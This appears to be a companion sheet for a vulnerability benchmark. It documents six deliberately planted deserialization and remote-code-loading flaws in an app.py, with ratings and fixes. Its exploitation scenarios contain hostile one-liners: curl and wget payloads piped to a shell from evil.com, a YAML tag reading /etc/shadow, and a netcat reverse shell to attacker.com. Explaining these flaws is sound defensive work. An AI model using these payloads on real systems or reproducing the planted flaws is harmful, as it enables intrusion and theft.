# Security Companion Document: app.py

## Language Exclusion Note: C, C++, and Rust

C and C++ are excluded from the Integrity Failures vulnerability class because they lack standard serialization libraries with known deserialization vulnerabilities comparable to Python's `pickle`, Java's `ObjectInputStream`, or JavaScript's `node-serialize`. While C and C++ can implement custom serialization, the language ecosystems do not have widely-used serialization frameworks that automatically invoke arbitrary code during deserialization. Rust is excluded because its dominant serialization library, `serde`, is safe by default — it deserializes into explicitly typed structures and does not execute arbitrary code during the deserialization process, making CWE-502 style attacks impractical without deliberate misuse of `unsafe` code.

---

## Vulnerability: Unsafe Pickle Deserialization of Workflow Import

**CWE:** CWE-502
**OWASP:** A08
**Complexity Level:** Obvious
**Detection Difficulty:** Easily_Detectable
**Affected Lines:** L126-L127

### Description
The `/api/workflows/import` endpoint accepts a base64-encoded payload and deserializes it using `pickle.loads()` when the format is set to `pickle`. Python's `pickle` module can execute arbitrary code during deserialization by invoking the `__reduce__` method on crafted objects, giving an attacker full remote code execution.

### Exploitation Scenario
An attacker sends a POST request to `/api/workflows/import` with `format` set to `pickle` and a base64-encoded payload containing a crafted pickle object that calls `os.system("curl http://evil.com/shell.sh | bash")`. When the server calls `pickle.loads()`, the malicious payload executes, granting the attacker a reverse shell.

### Remediation Guidance
Never use `pickle.loads()` on untrusted input. Use JSON for data interchange:
```python
workflow_data = json.loads(raw_bytes.decode("utf-8"))
```
If pickle is required for internal use, implement a restricted unpickler:
```python
import pickle
import io

class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        raise pickle.UnpicklingError(f"Forbidden: {module}.{name}")

def safe_loads(data):
    return RestrictedUnpickler(io.BytesIO(data)).load()
```

### Complexity Rationale
This is rated Obvious because `pickle.loads(raw_bytes)` on user-supplied data is a textbook deserialization vulnerability that any security-aware reviewer will immediately recognize.

### Detection Difficulty Rationale
This is rated Easily_Detectable because SAST tools can match `pickle.loads` calls with taint analysis tracing the input from `request.get_json()` through `base64.b64decode`.

---

## Vulnerability: Unsafe YAML Deserialization with yaml.Loader

**CWE:** CWE-502
**OWASP:** A08
**Complexity Level:** Moderate
**Detection Difficulty:** Pattern_Dependent
**Affected Lines:** L128-L129

### Description
The `/api/workflows/import` endpoint also supports YAML format and uses `yaml.load()` with `Loader=yaml.Loader` (the unsafe full Loader). PyYAML's full Loader can instantiate arbitrary Python objects via YAML tags like `!!python/object/apply:os.system`, enabling remote code execution.

### Exploitation Scenario
An attacker sends a base64-encoded YAML payload containing `!!python/object/apply:os.system ["wget http://evil.com/backdoor -O /tmp/bd && chmod +x /tmp/bd && /tmp/bd"]`. The server decodes and passes it to `yaml.load()` with the unsafe Loader, executing the command.

### Remediation Guidance
Use `yaml.safe_load()` or `Loader=yaml.SafeLoader`:
```python
workflow_data = yaml.safe_load(raw_bytes.decode("utf-8"))
```

### Complexity Rationale
This is rated Moderate because the code uses `yaml.load()` with an explicit `Loader` parameter, which may appear intentional. A reviewer must know that `yaml.Loader` is the unsafe variant and that `yaml.SafeLoader` should be used instead.

### Detection Difficulty Rationale
This is rated Pattern_Dependent because SAST tools need to distinguish between `yaml.Loader` (unsafe) and `yaml.SafeLoader` (safe). Tools with PyYAML-specific rules will flag this, but generic tools may not differentiate between Loader types.

---

## Vulnerability: Pickle Deserialization in Cache Retrieval

**CWE:** CWE-502
**OWASP:** A08
**Complexity Level:** Moderate
**Detection Difficulty:** Pattern_Dependent
**Affected Lines:** L222-L223

### Description
The `/api/cache/<key>` endpoint retrieves cached data by base64-decoding and then calling `pickle.loads()` on the stored value. While the data was originally serialized by the application via the `/api/cache/store` endpoint, the stored serialized bytes can be tampered with if an attacker gains access to the cache store or can manipulate the stored data through another vulnerability.

### Exploitation Scenario
An attacker who can write to the cache (via the `/api/cache/store` endpoint) stores a crafted pickle payload under a known key. When any user retrieves that key, `pickle.loads()` executes the embedded code. Alternatively, if the cache storage is shared or accessible, an attacker directly injects a malicious serialized object.

### Remediation Guidance
Replace pickle serialization with JSON for the cache:
```python
import json

# Store
CACHE[data["key"]] = {"data": json.dumps(data["value"]), ...}

# Retrieve
value = json.loads(entry["data"])
```

### Complexity Rationale
This is rated Moderate because the pickle usage is split across two endpoints (store and retrieve), requiring a reviewer to trace the data flow from serialization to deserialization and recognize that the stored bytes could be tampered with.

### Detection Difficulty Rationale
This is rated Pattern_Dependent because SAST tools must trace the data flow from the cache store through base64 encoding/decoding to the `pickle.loads` call, which involves interprocedural analysis across two separate request handlers.

---

## Vulnerability: Unsafe YAML Configuration Loading

**CWE:** CWE-502
**OWASP:** A08
**Complexity Level:** Moderate
**Detection Difficulty:** Easily_Detectable
**Affected Lines:** L237-L238

### Description
The `/api/config/load` endpoint parses user-supplied YAML configuration using `yaml.load()` with `Loader=yaml.Loader`. This is the same unsafe YAML deserialization pattern as the workflow import, but applied to a configuration loading context where the input comes directly from the request body without base64 encoding.

### Exploitation Scenario
An admin-authenticated attacker sends a POST request with `config_data` containing `!!python/object/apply:subprocess.check_output [["cat", "/etc/shadow"]]`. The YAML parser instantiates the Python object and executes the command, returning sensitive system data.

### Remediation Guidance
Use `yaml.safe_load()`:
```python
config = yaml.safe_load(data["config_data"])
```

### Complexity Rationale
This is rated Moderate because the endpoint is admin-restricted, which may lead a reviewer to assume the input is trusted. However, admin credentials can be compromised, and defense-in-depth requires safe parsing regardless of authentication.

### Detection Difficulty Rationale
This is rated Easily_Detectable because `yaml.load()` with `yaml.Loader` is a well-known unsafe pattern that SAST tools with PyYAML rules will flag directly.

---

## Vulnerability: Remote Code Loading via Extension URL

**CWE:** CWE-829
**OWASP:** A08
**Complexity Level:** Nuanced
**Detection Difficulty:** Likely_Missed
**Affected Lines:** L261-L265

### Description
The `/api/extensions/load` endpoint fetches Python code from a user-supplied URL using `urllib.request.urlopen()` and executes it with `exec(compile(code, ...))`. This allows an attacker to load and execute arbitrary Python code from any remote server, achieving full remote code execution.

### Exploitation Scenario
An attacker with engineer or admin credentials sends a request with `url` pointing to `http://evil.com/backdoor.py` containing `import os; os.system("nc -e /bin/sh attacker.com 4444")`. The server fetches and executes the code, establishing a reverse shell to the attacker's machine.

### Remediation Guidance
Never execute code fetched from remote URLs. Use a plugin registry with signature verification:
```python
import hashlib

TRUSTED_EXTENSIONS = {
    "analytics": {"url": "https://internal.repo/analytics.py", "sha256": "abc123..."},
}

def load_extension(name):
    ext = TRUSTED_EXTENSIONS.get(name)
    if not ext:
        raise ValueError("Unknown extension")
    code = urllib.request.urlopen(ext["url"]).read()
    if hashlib.sha256(code).hexdigest() != ext["sha256"]:
        raise ValueError("Integrity check failed")
```

### Complexity Rationale
This is rated Nuanced because the endpoint is role-restricted and the code fetching and execution are separated into distinct steps (`urlopen` then `exec`), requiring a reviewer to understand that the combination constitutes remote code execution even though each step individually may appear benign.

### Detection Difficulty Rationale
This is rated Likely_Missed because SAST tools would need to trace the data flow from `urlopen` through `response.read()` to `exec(compile(...))`, connecting network input to code execution across multiple statements. Most tools flag `exec` but may not connect it to the remote URL source.

---

## Vulnerability: Untrusted Plugin Download and Import

**CWE:** CWE-829
**OWASP:** A08
**Complexity Level:** Nuanced
**Detection Difficulty:** Likely_Missed
**Affected Lines:** L183-L186

### Description
The `/api/plugins/install` endpoint downloads a Python file from a user-supplied `source_url` using `urllib.request.urlretrieve()` and then imports it with `importlib.import_module()`. The downloaded code is saved to `/tmp/plugins/` and loaded without any integrity verification, signature checking, or sandboxing. The `on_install` hook is also called if present, executing arbitrary code.

### Exploitation Scenario
An attacker with engineer credentials provides a `source_url` pointing to a malicious Python module that defines `on_install()` to create a backdoor user or exfiltrate environment variables. The server downloads, saves, imports, and executes the module automatically.

### Remediation Guidance
Implement a trusted plugin registry with integrity verification:
```python
TRUSTED_PLUGINS = {"analytics": "sha256:abc123...", "reporting": "sha256:def456..."}

def install_plugin(module_name, source_url):
    if module_name not in TRUSTED_PLUGINS:
        raise ValueError("Untrusted plugin")
    # Download and verify hash before importing
    data = urllib.request.urlopen(source_url).read()
    actual_hash = hashlib.sha256(data).hexdigest()
    if f"sha256:{actual_hash}" != TRUSTED_PLUGINS[module_name]:
        raise ValueError("Integrity check failed")
```

### Complexity Rationale
This is rated Nuanced because the vulnerability spans multiple operations (download, save to disk, import, execute hook) and is behind role-based access control. A reviewer must understand that `importlib.import_module` on a file downloaded from an untrusted URL constitutes arbitrary code execution.

### Detection Difficulty Rationale
This is rated Likely_Missed because the code execution happens through `importlib.import_module` rather than `exec` or `eval`, and the connection between `urlretrieve` (network download) and `import_module` (code loading) requires multi-step taint analysis that most SAST tools do not perform.
